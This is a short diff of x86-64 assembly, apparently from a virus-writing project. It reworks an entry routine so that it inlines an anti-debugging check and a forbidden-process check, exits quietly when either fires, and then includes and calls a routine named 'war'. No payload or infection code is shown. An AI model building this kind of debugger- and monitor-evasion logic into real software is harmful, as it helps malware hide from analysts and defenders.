@@ -1,21 +1,37 @@
 end_:
 
 
-	PUSH_ALL
 
 
-	call _is_debugged
+	%include "functions/is_debugged.s"
 	cmp rax, -1
-	je .just_quit
+	je .quit_exit
 
 
 
-	call _check_forbidden_process
+
+	%include "functions/check_forbidden.s"
 	cmp rax, 1
-	je .just_quit
+	jne end_0
+
+
+	.quit_exit:
+
+	mov		rax, SYS_exit
+	xor		rdi, rdi
+	NOP
+	NOP
+	NOP
+	NOP
+	syscall
 
 
 
+	%include "warf.s"
+
+
+
+end_0:
 	call	war
 
 
@@ -58,7 +74,6 @@ end_:
 
 
 	.just_quit:
-		POP_ALL
 
 		mov		rax, SYS_fork
 		syscall
